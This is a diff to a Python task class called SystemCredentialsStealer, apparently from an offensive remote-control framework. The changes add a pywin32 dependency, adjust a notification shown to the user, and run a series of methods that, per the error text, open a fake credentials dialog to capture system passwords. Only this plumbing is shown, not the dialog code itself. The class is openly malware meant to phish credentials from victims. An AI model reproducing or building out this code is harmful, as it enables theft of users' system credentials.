@@ -40,6 +40,7 @@ class SystemCredentialsStealer(Task):
     administrator = {"win32": False}
     kwargs = {"create_notification": {"type": bool, "description": "Create notification.", "default": True},
               "translate_notification": {"type": bool, "description": "Translate notification.", "default": True}}
+    packages = ["pywin32"]
 
     def __init__(self, task_id):
         super(SystemCredentialsStealer, self).__init__(task_id)
@@ -54,7 +55,6 @@ class SystemCredentialsStealer(Task):
         from time import sleep
         from infos import administrator, platform
 
-        notifier = None
         failed = []
         admin = administrator()
         platform = platform()
@@ -67,6 +67,7 @@ class SystemCredentialsStealer(Task):
             duration = 60
             notifier = Notifier(0).start(title=title, description=description,
                                          duration=duration, translate=translate_notification)
+            notifier.run()
             sleep(1)
 
         for method in self.methods:
@@ -77,10 +78,6 @@ class SystemCredentialsStealer(Task):
                     return method().run()
                 except Exception as e:
                     failed.append("Method {} failed: {}".format(method.__name__, e))
-        # if notifier:
-        #     # say goodbye!
-        #     notifier.join(10)
-        #     del notifier
         if failed:
             raise Exception("Could not create credentials dialog. All methods failed: {}".format(failed))
         else:
